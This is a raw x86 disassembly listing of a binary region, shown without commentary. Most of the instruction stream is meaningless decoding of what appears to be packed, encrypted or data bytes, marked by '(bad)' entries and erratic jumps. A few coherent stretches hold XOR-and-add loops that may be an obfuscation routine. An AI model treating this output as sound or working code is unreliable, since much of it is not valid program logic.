  408063:	fstp   QWORD PTR [edi+0x70]
  408066:	pop    esi
  408067:	sub    DWORD PTR [eax+0x1173d43f],edx
  40806d:	test   DWORD PTR [edi-0x6c],eax
  408070:	sub    al,0x75
  408072:	cmc    
  408073:	sbb    edx,ebx
  408075:	fldenv [eax]
  408077:	stos   DWORD PTR es:[edi],eax
  408078:	jmp    0x921372ac
  40807d:	sub    eax,ebx
  40807f:	push   ecx
  408080:	push   ebx
  408081:	sub    dl,BYTE PTR [ecx-0x6006567e]
  408087:	retf   
  408088:	mov    dh,0x47
  40808a:	scas   al,BYTE PTR es:[edi]
  40808b:	fdiv   QWORD PTR ds:0xe1f8ff4e
  408091:	xchg   ebx,eax
  408092:	seto   BYTE PTR [edx]
  408095:	push   ds
  408096:	daa    
  408097:	xchg   BYTE PTR [ebp-0x6bb7ae4],cl
  40809d:	sbb    edi,DWORD PTR [ebx-0x5fd5b5f4]
  4080a3:	dec    edx
  4080a4:	mov    bh,BYTE PTR [eax-0x5e5a0aac]
  4080aa:	and    ebp,edi
  4080ac:	pop    ecx
  4080ad:	push   ebx
  4080ae:	jns    0x4080df
  4080b0:	mov    ?,ebx
  4080b2:	adc    BYTE PTR [eax],ah
  4080b4:	or     ch,ch
  4080b6:	jbe    0x40805b
  4080b8:	adc    ah,BYTE PTR [ebp+0x24086b62]
  4080be:	loopne 0x4080f9
  4080c0:	imul   edx,DWORD PTR [ecx],0x3a
  4080c3:	sbb    BYTE PTR [ebx-0x64],0xf8
  4080c7:	dec    ebp
  4080c8:	arpl   WORD PTR [edx+0x6d8e2033],bp
  4080ce:	fsubr  QWORD PTR [edx-0x43]
  4080d1:	xor    eax,ecx
  4080d3:	add    eax,esi
  4080d5:	mov    DWORD PTR [edx],eax
  4080d7:	mov    eax,DWORD PTR [ebp-0x8]
  4080da:	xor    eax,ecx
  4080dc:	add    eax,esi
  4080de:	mov    DWORD PTR [ebp+0x8],eax
  4080e1:	mov    eax,DWORD PTR [ebp+0x8]
  4080e4:	jmp    0x4083ed
  4080e9:	ret    
  4080ea:	ror    ch,1
  4080ec:	rcr    ecx,0xc9
  4080ef:	rcl    esi,cl
  4080f1:	push   edx
  4080f2:	add    DWORD PTR [edx-0x53b4188b],eax
  4080f8:	cwde   
  4080f9:	hlt    
  4080fa:	fnstsw WORD PTR [eax+0x78]
  4080fd:	fs jle 0x408178
  408100:	js     0x408132
  408102:	add    DWORD PTR [edx],edi
  408104:	sub    bh,BYTE PTR [eax+0x5e6f6b56]
  40810a:	mov    bh,0x28
  40810c:	mov    esp,0x73f36450
  408111:	mov    ds:0x12cce0f2,eax
  408116:	jg     0x4080c5
  408118:	repz push esp
  40811a:	(bad)  
  40811b:	push   eax
  40811c:	inc    ecx
  40811d:	push   0x5c6bdb01
  408122:	mov    fs,WORD PTR [esi-0x2a]
  408125:	aad    0xcd
  408127:	mov    eax,0xddd2bfe5
  40812c:	sbb    DWORD PTR [ebp+0x3e809a76],ebp
  408132:	xor    DWORD PTR [edi],eax
  408134:	cwde   
  408135:	ins    DWORD PTR es:[edi],dx
  408136:	dec    esi
  408137:	cmp    DWORD PTR [esi+0x1e],ecx
  40813a:	jp     0x4081b3
  40813c:	dec    ebp
  40813d:	mov    ch,0x65
  40813f:	pop    ds
  408140:	mov    eax,ds:0x945b2106
  408145:	scas   al,BYTE PTR es:[edi]
  408146:	jae    0x40817b
  408148:	fwait
  408149:	mov    DWORD PTR [ecx+0x387d4e24],0xf31ddbc9
  408153:	jg     0x40816e
  408155:	retf   0x90ca
  408158:	or     al,0x7b
  40815a:	cmp    BYTE PTR [edi+eiz*2-0x11e813fc],cl
  408161:	jmp    0x4081c1
  408163:	adc    BYTE PTR [ebx],dh
  408165:	imul   esi,DWORD PTR [ebx+0xa],0x711ea59
  40816c:	xchg   ecx,eax
  40816d:	outs   dx,BYTE PTR ds:[esi]
  40816e:	call   0x8b8ad649
  408173:	es mov cl,0xc7
  408176:	imul   edi,DWORD PTR [edi-0x372b9bce],0x5e
  40817d:	icebp  
  40817e:	pop    esi
  40817f:	std    
  408180:	mov    ds:0x78c63fe7,al
  408185:	sbb    bl,al
  408187:	ins    BYTE PTR es:[edi],dx
  408188:	add    eax,0x76edc65f
  40818d:	stos   BYTE PTR es:[edi],al
  40818e:	xor    BYTE PTR [ebx-0x2c727aa8],bh
  408194:	loopne 0x4081bf
  408196:	jne    0x408123
  408198:	int3   
  408199:	ja     0x40813a
  40819b:	dec    edx
  40819c:	xchg   ebp,eax
  40819d:	cmp    al,0xd6
  40819f:	sbb    al,0xc6
  4081a1:	mov    edi,0x498b66b2
  4081a6:	xor    al,BYTE PTR [esi+0x17]
  4081a9:	fiadd  DWORD PTR [ecx+0x3c12cedf]
  4081af:	sbb    eax,0xfdf7f555
  4081b4:	cmp    eax,0x38c83419
  4081b9:	cs jmp 0x4081ab
  4081bc:	sti    
  4081bd:	jecxz  0x40819c
  4081bf:	sub    dl,BYTE PTR [ecx+0x40e9bf5c]
  4081c5:	jb     0x408166
  4081c7:	aas    
  4081c8:	scas   eax,DWORD PTR es:[edi]
  4081c9:	or     BYTE PTR [ebp-0x76],cl
  4081cc:	loope  0x4081f8
  4081ce:	outs   dx,DWORD PTR ds:[esi]
  4081cf:	mov    ds:0x51db278,al
  4081d4:	mov    al,0x64
  4081d6:	lahf   
  4081d7:	leave  
  4081d8:	movlps xmm1,QWORD PTR [edx+0x28]
  4081dc:	mov    bh,0xb
  4081de:	fld    TBYTE PTR [esi]
  4081e0:	mov    eax,0xdea27b63
  4081e5:	adc    DWORD PTR [edx-0x4d],esi
  4081e8:	scas   al,BYTE PTR es:[edi]
  4081e9:	repnz scas al,BYTE PTR es:[edi]
  4081eb:	jmp    0xa303:0xf8fb24
  4081f2:	xor    al,0x38
  4081f4:	fucomi st,st(4)
  4081f6:	data16 daa 
  4081f8:	adc    eax,0xc861e933
  4081fd:	dec    ebp
  4081fe:	jl     0x4081d8
  408200:	push   esp
  408201:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408202:	jne    0x252a86db
  408208:	sbb    ebp,DWORD PTR [edx-0x6e]
  40820b:	(bad)  
  40820c:	jg     0x4081c1
  40820e:	dec    esi
  40820f:	add    dl,BYTE PTR [ebp+eax*1+0x5c]
  408213:	push   ss
  408214:	adc    dh,0x6c
  408217:	or     al,0x16
  408219:	pop    esp
  40821a:	sub    dl,ch
  40821c:	in     al,dx
  40821d:	mov    eax,0xfac29807
  408222:	pop    ebp
  408223:	enter  0xa451,0x1c
  408227:	shr    bl,0x7b
  40822a:	add    cl,BYTE PTR [edi-0x400ddb34]
  408230:	imul   BYTE PTR [ebp-0x1c]
  408233:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408234:	mov    cs,WORD PTR [eax+0x2166c644]
  40823a:	push   ecx
  40823b:	pop    ecx
  40823c:	inc    esi
  40823d:	adc    eax,0xd2807cf3
  408242:	mov    al,0x7
  408244:	add    eax,0x8e00e466
  408249:	push   eax
  40824a:	stc    
  40824b:	mov    dh,0xa3
  40824d:	scas   eax,DWORD PTR es:[edi]
  40824e:	adc    eax,0x67d96509
  408253:	adc    DWORD PTR [ebx-0x120e5b31],0x53
  40825a:	cmp    BYTE PTR es:[ecx],ah
  40825d:	ror    DWORD PTR [edi+0x4227a131],0x80
  408264:	stos   DWORD PTR es:[edi],eax
  408265:	bound  edx,QWORD PTR [esi+0x12bae0d8]
  40826b:	in     al,dx
  40826c:	rcr    BYTE PTR [eax],cl
  40826e:	add    BYTE PTR [ecx],0xfd
  408271:	cld    
  408272:	je     0x40829d
  408274:	pop    esi
  408275:	dec    ecx
  408276:	retf   
  408277:	loope  0x40823f
  408279:	push   edi
  40827a:	jnp    0x408246
  40827c:	xor    DWORD PTR fs:[eax+0x11eb9595],edi
  408283:	aam    0x21
  408285:	in     eax,0x57
  408287:	imul   eax,DWORD PTR [ebx],0xffffff8e
  40828a:	das    
  40828b:	and    esi,edi
  40828d:	(bad)  
  40828e:	sub    eax,0x3fce6794
  408293:	out    dx,eax
  408294:	add    ebp,edx
  408296:	lea    ebp,ds:[ebx]
  408299:	iret   
  40829a:	mul    DWORD PTR [edx+0x2cd122f6]
  4082a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4082a1:	dec    ebx
  4082a2:	push   es
  4082a3:	sub    al,0xf3
  4082a5:	and    BYTE PTR [eax-0x1b],dl
  4082a8:	mov    al,0x17
  4082aa:	lods   al,BYTE PTR ds:[esi]
  4082ab:	sahf   
  4082ac:	adc    al,0x3d
  4082ae:	inc    edi
  4082af:	and    ebx,ebp
  4082b1:	outs   dx,BYTE PTR ds:[esi]
  4082b2:	ficom  WORD PTR [ecx-0x4c]
  4082b5:	jp     0x4082a0
  4082b7:	hlt    
  4082b8:	xchg   ecx,eax
  4082b9:	sbb    ecx,DWORD PTR [ebx-0x62c1de4c]
  4082bf:	adc    ebp,DWORD PTR [esi-0x691c97e8]
  4082c5:	mov    al,ds:0x4c3f0c5d
  4082ca:	push   cs
  4082cb:	movups XMMWORD PTR [edi+eax*8-0x69e77c4b],xmm4
  4082d3:	dec    DWORD PTR [eax-0x78]
  4082d6:	popf   
  4082d7:	push   edx
  4082d8:	call   0x4558:0x6d1cb528
  4082df:	fsub   DWORD PTR [ebx-0x3c]
  4082e2:	mov    gs,WORD PTR [esi+0x19803e52]
  4082e8:	add    BYTE PTR [ecx-0xfaff00],ch
  4082ee:	pop    ds
  4082ef:	mov    edx,DWORD PTR [edi-0x2ae47811]
  4082f5:	cmp    al,0x5
  4082f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4082f8:	lea    esp,[ebp+ecx*8-0x10]
  4082fc:	ss cmp eax,0x5eb17101
  408302:	cmp    DWORD PTR ds:0x8254be5d,eax
  408308:	xor    eax,0xdce5c0c2
  40830d:	xchg   WORD PTR [ecx-0x6a],bx
  408311:	les    ebx,FWORD PTR [eax]
  408313:	or     DWORD PTR [ebx],esi
  408315:	call   0x4c69b751
  40831a:	dec    edx
  40831b:	sbb    ch,dl
  40831d:	dec    esp
  40831e:	neg    dh
  408320:	imul   edx,DWORD PTR ds:0x59604f17,0xd992d413
  40832a:	pop    ebx
  40832b:	mov    al,0xa8
  40832d:	mov    bh,0xee
  40832f:	ins    BYTE PTR es:[edi],dx
  408330:	outs   dx,DWORD PTR ds:[esi]
  408331:	inc    esi
  408332:	xchg   edx,eax
  408333:	out    dx,eax
  408334:	outs   dx,DWORD PTR ds:[esi]
  408335:	adc    BYTE PTR [esi+0x28bd4bd9],cl
  40833b:	fs repnz pusha 
  40833e:	xor    eax,0xf0adf080
  408343:	ret    0x7d41
  408346:	fisub  WORD PTR [eax+edx*2+0x4]
  40834a:	mov    esi,0x41b93507
  40834f:	arpl   WORD PTR [eax+0x6a19008a],bp
  408355:	ret    
  408356:	adc    edx,DWORD PTR [edi+0x5886825e]
  40835c:	inc    ecx
  40835d:	lods   eax,DWORD PTR ds:[esi]
  40835e:	nop
  40835f:	sbb    edx,eax
  408361:	shl    ebp,cl
  408363:	repz in al,dx
  408365:	ficom  DWORD PTR [edx+0x60d57009]
  40836b:	(bad)  
  40836c:	es mov esp,edx
  40836f:	and    BYTE PTR [edi+0x2a],al
  408372:	xor    esi,ecx
  408374:	popf   
  408375:	xlat   BYTE PTR ds:[ebx]
  408376:	cdq    
  408377:	(bad)  
  408378:	mov    esp,0x1dc0318d
  40837d:	in     eax,dx
  40837e:	mov    cl,0x42
  408380:	paddusw mm2,QWORD PTR [ecx+0x26d8b7ab]
  408387:	pop    edi
  408388:	mov    bl,BYTE PTR [esp+edx*4]
  40838b:	or     DWORD PTR [ebp-0x2d],ebp
  40838e:	push   esi
  40838f:	push   ecx
  408390:	imul   edx,DWORD PTR [ecx+0x508f1ae3],0x1fa9f671
  40839a:	jecxz  0x4083a7
  40839c:	repnz not sp
  4083a0:	mov    al,0xbe
  4083a2:	mov    ds:0x32153883,al
  4083a7:	push   edx
  4083a8:	icebp  
  4083a9:	or     DWORD PTR [edx-0x36],edx
  4083ac:	std    
  4083ad:	dec    edx
  4083ae:	repnz mov al,ds:0x71af3137
  4083b4:	iret   
  4083b5:	push   ebx
  4083b6:	cld    
  4083b7:	loopne 0x4083c8
  4083b9:	mov    eax,ds:0x45ba2f68
  4083be:	nop
  4083bf:	ror    BYTE PTR [eax-0x5e95196d],0x12
  4083c6:	sbb    cl,BYTE PTR ds:0x901fcc9d
  4083cc:	sub    eax,0x32e457ce
  4083d1:	popa   
  4083d2:	retf   0x9d54
  4083d5:	and    eax,DWORD PTR [ecx+eiz*8-0x45]
  4083d9:	test   DWORD PTR [ebx+edx*4+0x29],edi
  4083dd:	inc    DWORD PTR [ecx-0x7d]
  4083e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4083e1:	xor    bh,BYTE PTR [edi+0x6018e112]
  4083e7:	test   DWORD PTR [edi],ebx
  4083e9:	pop    ebp
  4083ea:	mov    ecx,0x448ae5c7
  4083ef:	add    eax,0xff558aa8
  4083f4:	cmp    al,dl
  4083f6:	je     0x408742
  4083fc:	mov    eax,DWORD PTR [ebp+0x8]
  4083ff:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  408403:	mov    edx,DWORD PTR [ebp+0xc]
  408406:	cmp    al,BYTE PTR [edx]
  408408:	jne    0x408a71
  40840e:	mov    eax,DWORD PTR [ebp-0x8]
  408411:	mov    edx,DWORD PTR [ebp+0xc]
  408414:	movsx  edx,BYTE PTR [edx]
  408417:	xor    eax,ecx
  408419:	add    eax,esi
  40841b:	cmp    edx,eax
  40841d:	je     0x40875c
  408423:	mov    DWORD PTR [ebp-0x18],0x705fd8e
  40842a:	jmp    0x408733
  40842f:	cmp    al,0xc8
  408431:	rcl    dl,0xd4
  408434:	fcmovu st,st(2)
  408436:	into   
  408437:	(bad)  
  408438:	leave  
  408439:	xchg   BYTE PTR [edi+0x4260be64],dl
  40843f:	loopne 0x408423
  408441:	js     0x4084bb
  408443:	fs jle 0x4084be
  408446:	js     0x40848d
  408448:	jo     0x4084b8
  40844a:	or     esi,DWORD PTR [esi-0x9beafb9]
  408450:	mov    es,WORD PTR [edi+0x4]
  408453:	mov    al,ds:0x28ce16bc
  408458:	iret   
  408459:	repnz sti 
  40845b:	out    dx,al
  40845c:	adc    DWORD PTR [edi+0x7f],ebx
  40845f:	sub    eax,0x19d551e6
  408464:	hlt    
  408465:	mov    ebx,0x2086d1c7
  40846a:	or     bh,cl
  40846c:	push   ecx
  40846d:	addr16 cld 
  40846f:	in     al,dx
  408470:	aad    0xe0
  408472:	jns    0x4084e7
  408474:	ror    DWORD PTR [eax+0x47f771c6],1
  40847a:	int    0x1e
  40847c:	retf   
  40847d:	xor    ebp,esi
  40847f:	sar    esp,cl
  408481:	xchg   ecx,eax
  408482:	cld    
  408483:	inc    esi
  408484:	or     eax,0x5f3fabc5
  408489:	pusha  
  40848a:	imul   esp,DWORD PTR [ebx+0x60],0x39
  40848e:	push   edi
  40848f:	test   al,0xc2
  408491:	out    dx,al
  408492:	push   es
  408493:	ret    0x2530
  408496:	cld    
  408497:	(bad)  
  408499:	mov    DWORD PTR [eax],ebx
  40849b:	xchg   edx,eax
  40849c:	in     eax,dx
  40849d:	pop    ebp
  40849e:	(bad)  
  40849f:	dec    cl
  4084a1:	or     al,0xd
  4084a3:	pandn  mm3,QWORD PTR [edx+eiz*2+0x45e39559]
  4084ab:	add    eax,0x27bc1973
  4084b0:	jp     0x4084bd
  4084b2:	(bad)  
  4084b3:	cmovle edi,edx
  4084b6:	addr16 jb 0x40850a
  4084b9:	lea    eax,[ebx+0x1e118b4e]
  4084bf:	mov    bl,0xda
  4084c1:	es fld st(1)
  4084c4:	push   ss
  4084c5:	inc    ecx
  4084c6:	inc    edx
  4084c7:	popa   
  4084c8:	ja     0x40851f
  4084ca:	pop    edi
  4084cb:	cdq    
  4084cc:	push   ebp
  4084cd:	xlat   BYTE PTR ds:[ebx]
  4084ce:	dec    ecx
  4084cf:	pop    ebx
  4084d0:	xchg   BYTE PTR [edi],ah
  4084d2:	mov    DWORD PTR [edi],edx
  4084d4:	sub    DWORD PTR ds:0xfabf197e,esp
  4084da:	mov    DWORD PTR [ebx+0x5a],ebp
  4084dd:	adc    DWORD PTR [esi+0x26],esi
  4084e0:	jg     0x408544
  4084e2:	sub    al,BYTE PTR [esi+edi*1]
  4084e5:	add    esp,DWORD PTR [eax]
  4084e7:	push   es
  4084e8:	cmp    ah,0xec
  4084eb:	jnp    0x408523
  4084ed:	popf   
  4084ee:	pop    eax
  4084ef:	daa    
  4084f0:	clc    
  4084f1:	stos   DWORD PTR es:[edi],eax
  4084f2:	sub    DWORD PTR [esi],0x2f
  4084f5:	mov    bh,0x53
  4084f7:	mov    bl,BYTE PTR [ebx]
  4084f9:	pop    eax
  4084fa:	jmp    0xdf4a:0x9ac5d3ae
  408501:	jmp    0x408483
  408503:	add    eax,0x919fea8
  408508:	test   al,0xaf
  40850a:	mov    bh,0x18
  40850c:	mov    ebp,0xf0f7138c
  408511:	pop    edi
  408512:	push   0xb2400066
  408517:	mov    edx,0x355682e7
  40851c:	mul    DWORD PTR [esi-0x28845d4d]
  408522:	popf   
  408523:	xor    DWORD PTR [eax+0x7f3345e0],esi
  408529:	mov    esi,0x8b44350f
  40852e:	inc    ebp
  40852f:	repnz scas al,BYTE PTR es:[edi]
  408531:	test   al,0xc8
  408533:	push   0xffffffd4
  408535:	add    edi,DWORD PTR [eax-0x7563f0a5]
  40853b:	cmpxchg DWORD PTR [ecx-0x7c3bf968],esi
  408542:	and    esp,DWORD PTR [ecx]
  408544:	popa   
  408545:	pop    esi
  408546:	jg     0x408554
  408548:	inc    edi
  408549:	xor    eax,0x40443e39
  40854e:	daa    
  40854f:	data16 adc ah,BYTE PTR [edx+eiz*1+0x44]
  408554:	iret   
  408555:	loope  0x4084e2
  408557:	fs pushf 
  408559:	jno    0x408562
  40855b:	mov    dl,0xc6
  40855d:	outs   dx,DWORD PTR ds:[esi]
  40855e:	iret   
  40855f:	imul   eax,DWORD PTR [edx],0x2b
  408562:	add    DWORD PTR [eax+0x5],ebx
  408565:	jg     0x40850d
  408567:	test   eax,0xdf376f5c
  40856c:	mov    ch,BYTE PTR [edi+0x29]
  40856f:	inc    ecx
  408570:	xchg   esi,eax
  408571:	fnstsw WORD PTR [eax+0x3a]
  408574:	iret   
  408575:	xlat   BYTE PTR ds:[ebx]
  408576:	and    esp,DWORD PTR [edx+eiz*1-0x6c5dbd86]
  40857d:	xchg   edi,eax
  40857e:	aam    0xbf
  408580:	scas   al,BYTE PTR es:[edi]
  408581:	jne    0x408551
  408583:	jmp    0x79bd:0xd82d4141
  40858a:	jns    0x4085fa
  40858c:	js     0x408576
  40858e:	or     DWORD PTR [edi+0x18],esp
  408591:	(bad)  
  408592:	jnp    0x408515
  408594:	mov    WORD PTR [eax],?
  408596:	test   eax,0x904cf7a7
  40859b:	xchg   ebx,eax
  40859c:	call   0x6767:0xcd73bcf
  4085a3:	dec    edx
  4085a4:	inc    ebx
  4085a5:	mov    DWORD PTR [edx],esp
  4085a7:	test   DWORD PTR [ebx+0x18],ebx
  4085aa:	sbb    ecx,DWORD PTR [ecx]
  4085ac:	xchg   ecx,eax
  4085ad:	je     0x4085b8
  4085af:	cmp    bl,BYTE PTR cs:[eax+edx*2+0x4bfd91cc]
  4085b7:	xor    al,0x80
  4085b9:	add    eax,0x2795b0c1
  4085be:	retf   
  4085bf:	pop    ss
  4085c0:	retf   
  4085c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4085c2:	cmp    BYTE PTR [ebx+eiz*1],0x96
  4085c6:	in     al,dx
  4085c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4085c8:	xchg   esp,eax
  4085c9:	inc    eax
  4085ca:	or     eax,0xc6a723d0
  4085cf:	mov    ah,0xd4
  4085d1:	sbb    al,0x8c
  4085d3:	dec    eax
  4085d4:	fnstcw WORD PTR ds:0xd5a5b87c
  4085da:	stos   BYTE PTR es:[edi],al
  4085db:	pop    ebp
  4085dc:	dec    edi
  4085dd:	sbb    edi,DWORD PTR [edi+0x5cf9e157]
  4085e3:	push   es
  4085e4:	mov    edi,0x13ec281a
  4085e9:	push   ebx
  4085ea:	push   ecx
  4085eb:	repz and al,0xc8
  4085ee:	cs cld 
  4085f0:	aaa    
  4085f1:	adc    BYTE PTR [ebx+0x17],dh
  4085f4:	ret    0xbd75
  4085f7:	add    eax,0x869f3142
  4085fc:	int    0x33
  4085fe:	and    DWORD PTR [ebp-0x53],edi
  408601:	loop   0x408657
  408603:	(bad)  
  408604:	loope  0x40858b
  408606:	fsub   QWORD PTR [edx+0x75bb3e0c]
  40860c:	xchg   ebx,eax
  40860d:	enter  0x638a,0x8f
  408611:	mov    esp,0xb06768da
  408616:	lsl    esi,ax
  408619:	adc    DWORD PTR [ebp+0xd],edi
  40861c:	inc    ecx
  40861d:	sti    
  40861e:	ins    DWORD PTR es:[edi],dx
  40861f:	mov    ds:0x1c9dcf52,al
  408624:	test   DWORD PTR [edx],esp
  408626:	test   bl,ah
  408628:	pushf  
  408629:	shl    BYTE PTR [edi],0xf8
  40862c:	fsubr  DWORD PTR [esi-0x1f6031f6]
  408632:	push   ebp
  408633:	cld    
  408634:	mov    bl,0x4d
  408636:	fstp   TBYTE PTR [edi-0x20962844]
  40863c:	adc    eax,0x9f2a3b61
  408641:	jp     0x408677
  408643:	dec    ebx
  408644:	sar    bl,1
  408646:	mov    cl,0xb8
  408648:	dec    esi
  408649:	es mov eax,0xe745448c
  40864f:	mov    eax,ds:0xb1109b72
  408654:	lods   al,BYTE PTR ds:[esi]
  408655:	and    ah,BYTE PTR [esp+eax*1]
  408658:	(bad)  
  40865a:	mov    ecx,0xb46bb99d
  40865f:	add    eax,0x5f290a38
  408664:	jecxz  0x408670
  408666:	inc    eax
  408667:	je     0x408629
  408669:	xchg   DWORD PTR [esi-0x4699e6b8],esp
  40866f:	mov    bh,0xd7
  408671:	push   eax
  408672:	or     eax,DWORD PTR [edi+0x68]
  408675:	and    edx,esp
  408677:	or     ah,ch
  408679:	ret    
  40867a:	inc    eax
  40867b:	push   ebx
  40867c:	xor    BYTE PTR [edi+edi*1-0x23],bl
  408680:	test   al,0x51
  408682:	scas   ax,WORD PTR es:[edi]
  408684:	inc    esi
  408685:	jecxz  0x4086af
  408687:	jp     0x408645
  408689:	arpl   WORD PTR [eax+0x4e],cx
  40868c:	(bad)  
  40868e:	mov    edx,0x71069e67
  408693:	mov    ah,0x67
  408695:	mov    ebx,0x2874093a
  40869a:	inc    ebp
  40869b:	sar    dl,1
  40869d:	repnz daa 
  40869f:	lea    ecx,[edx+0x15]
  4086a2:	mov    edx,0xb866d1a7
  4086a7:	test   eax,0x4d748001
  4086ac:	or     DWORD PTR [edx-0x3b],0x7de8c8e6
  4086b3:	rep ins BYTE PTR es:[edi],dx
  4086b5:	xor    BYTE PTR [eax*1+0x6faed431],ch
  4086bc:	sbb    DWORD PTR [ebp-0x2f],ebp
  4086bf:	arpl   WORD PTR ss:[eax+0x6c7a9415],dx
  4086c6:	int3   
  4086c7:	out    0x1b,al
  4086c9:	mov    ebx,0xd71f6c91
  4086ce:	stos   BYTE PTR es:[edi],al
  4086cf:	scas   eax,DWORD PTR es:[edi]
  4086d0:	push   edx
  4086d1:	xchg   esp,eax
  4086d2:	inc    ecx
  4086d3:	cmp    BYTE PTR [ebp+0x16],cl
  4086d6:	dec    esp
  4086d7:	rol    DWORD PTR [esi+0x6f],1
  4086da:	fst    QWORD PTR [ecx]
  4086dc:	scas   eax,DWORD PTR es:[edi]
  4086dd:	cli    
  4086de:	and    esi,ecx
  4086e0:	push   eax
  4086e1:	push   cs
  4086e2:	mov    bh,0xa6
  4086e4:	jo     0x408721
  4086e6:	in     al,dx
  4086e7:	pop    ds
  4086e8:	cmovns ebx,DWORD PTR [eax]
  4086eb:	sub    edi,ebp
  4086ed:	mov    edi,0x1dcfe676
  4086f2:	cmp    DWORD PTR [esi],0xcf9b8864
  4086f8:	or     BYTE PTR [edx-0x30],al
  4086fb:	push   edx
  4086fc:	popf   
  4086fd:	ins    BYTE PTR es:[edi],dx
  4086fe:	and    ch,BYTE PTR [ebp-0x6e]
  408701:	or     al,0x5c
  408703:	cwde   
  408704:	out    dx,al
  408705:	mov    esp,0xc2e14c32
  40870a:	mov    dl,0x89
  40870c:	dec    esp
  40870d:	pusha  
  40870e:	sub    BYTE PTR [ebx+0x575ae951],ah
  408714:	bound  ebp,QWORD PTR [esi-0x34e58ddc]
  40871a:	ss cmc 
  40871c:	mov    ?,WORD PTR [ebx-0x17]
  40871f:	int3   
  408720:	mov    cx,0x939a
  408724:	push   edi
  408725:	jnp    0x40870d
  408727:	cwde   
  408728:	sar    ebx,0x31
  40872b:	fstp   DWORD PTR [ebx+0x395a5707]
  408731:	fwait
  408732:	daa    
  408733:	lea    eax,[ebp-0x18]
  408736:	mov    DWORD PTR [ebp-0x14],eax
  408739:	mov    eax,DWORD PTR [ebp-0x14]
  40873c:	add    DWORD PTR [eax],0x705fa8e
  408742:	mov    eax,DWORD PTR [ebp-0x10]
  408745:	mov    edx,DWORD PTR [ebp+0x8]
  408748:	xor    eax,ecx
  40874a:	lea    eax,[eax+edx*1+0x327298]
  408751:	mov    DWORD PTR [ebp+0x8],eax
  408754:	inc    DWORD PTR [ebp+0xc]
  408757:	jmp    0x4080e1
  40875c:	mov    eax,DWORD PTR [ebp-0x10]
  40875f:	xor    eax,ecx
  408761:	mov    ecx,DWORD PTR [ebp+0x10]
  408764:	add    eax,esi
  408766:	jmp    0x408a6f
  40876b:	(bad)
  40876e:	aas    
  40876f:	fld    st(3)
  408771:	(bad)  
  408773:	add    edi,DWORD PTR [ebp-0x7e]
  408776:	sahf   
  408777:	lds    esi,FWORD PTR [eax]
  408779:	mov    eax,ds:0x78e7ccca
  40877e:	js     0x4087e4
  408780:	jle    0x4087fa
  408782:	js     0x408767
  408784:	xor    ah,BYTE PTR [ecx+edi*8]
  408787:	add    ecx,DWORD PTR [edx+0x23]
  40878a:	mov    edi,0x31b26785
  40878f:	pop    esi
  408790:	scas   eax,DWORD PTR es:[edi]
  408791:	xchg   ebx,eax
  408792:	sub    al,0x21
  408794:	cdq    
  408795:	outs   dx,DWORD PTR ds:[esi]
  408796:	pop    edx
  408797:	pushf  
  408798:	call   0x45e8:0xeebc0b56
  40879f:	(bad)  
  4087a0:	daa    
  4087a1:	mov    WORD PTR ds:0x7a6dd8cf,?
  4087a7:	xor    esi,DWORD PTR [ebp-0x43]
  4087aa:	mov    dh,BYTE PTR [edi+0x11]
  4087ad:	cmc    
  4087ae:	es inc esi
  4087b0:	pop    esp
  4087b1:	adc    edx,DWORD PTR [eax+ebx*2]
  4087b4:	sbb    al,0xcf
  4087b6:	lock aas 
  4087b8:	test   BYTE PTR [eax],ah
  4087ba:	xor    bh,BYTE PTR [ebx-0x2b]
  4087bd:	jae    0x408744
  4087bf:	or     esp,DWORD PTR [ebx+0x6b25f723]
  4087c5:	jno    0x4087c9
  4087c7:	fucomip st,st(0)
  4087c9:	pop    esi
  4087ca:	mov    cl,0x49
  4087cc:	mov    eax,0x3d5c8dfa
  4087d1:	sbb    edi,DWORD PTR [edi]
  4087d3:	lock pop esp
  4087d5:	or     DWORD PTR [ecx-0x2e2571a9],0x7f9f60c8
  4087df:	xchg   edx,eax
  4087e0:	mov    cl,0xff
  4087e2:	out    0x3,eax
  4087e4:	sub    DWORD PTR ds:0xcbcbfd5a,ebp
  4087ea:	pop    esp
  4087eb:	dec    edx
  4087ec:	add    eax,0xb7aa2b9d
  4087f1:	int    0x94
  4087f3:	jmp    0x136d:0x80833be
  4087fa:	sub    cl,BYTE PTR [ebp-0x23]
  4087fd:	scas   al,BYTE PTR es:[edi]
  4087fe:	in     eax,dx
  4087ff:	jns    0x408801
  408801:	mov    ah,BYTE PTR [ecx-0x4e]
  408804:	mov    ebx,0x924f23f1
  408809:	je     0x408868
  40880b:	mov    al,ds:0x763452ba
  408810:	xchg   BYTE PTR [ecx],cl
  408812:	mov    ecx,ebp
  408814:	clc    
  408815:	jmp    0x91d3cf9f
  40881a:	pop    edi
  40881b:	and    eax,0xc6dc4eda
  408820:	pushf  
  408821:	sub    al,BYTE PTR [edx+0x1c]
  408824:	jmp    0xe10ba9ca
  408829:	arpl   WORD PTR [esi+0x28],cx
  40882c:	jae    0x408806
  40882e:	mov    ch,BYTE PTR [ecx+0x37]
  408831:	ret    
  408832:	ins    DWORD PTR es:[edi],dx
  408833:	out    0x6b,al
  408835:	loope  0x408823
  408837:	jge    0x40884a
  408839:	sbb    DWORD PTR [ebx-0x6595a420],edi
  40883f:	imul   eax,ebp,0x25
  408842:	aad    0xf4
  408844:	or     cl,al
  408846:	push   cs
  408847:	scas   eax,DWORD PTR es:[edi]
  408848:	mov    cl,0x91
  40884a:	push   cs
  40884b:	mov    ebp,0xe5059a73
  408850:	pop    ss
  408851:	out    dx,al
  408852:	push   ss
  408853:	mov    edx,0xcfd1596
  408858:	daa    
  408859:	push   edx
  40885a:	jg     0x408877
  40885c:	adc    ecx,DWORD PTR [ebp+0x69]
  40885f:	pushf  
  408860:	jbe    0x4087f9
  408862:	aad    0x3e
  408864:	xchg   ebx,eax
  408865:	ret    
  408866:	fucomip st,st(0)
  408868:	xchg   ebp,eax
  408869:	(bad)  
  40886a:	push   edi
  40886b:	sbb    al,0x10
  40886d:	push   ds
  40886e:	(bad)  
  40886f:	in     al,0xd8
  408871:	fwait
  408872:	dec    esp
  408873:	mov    BYTE PTR [eax-0x28],ah
  408876:	xor    al,0x95
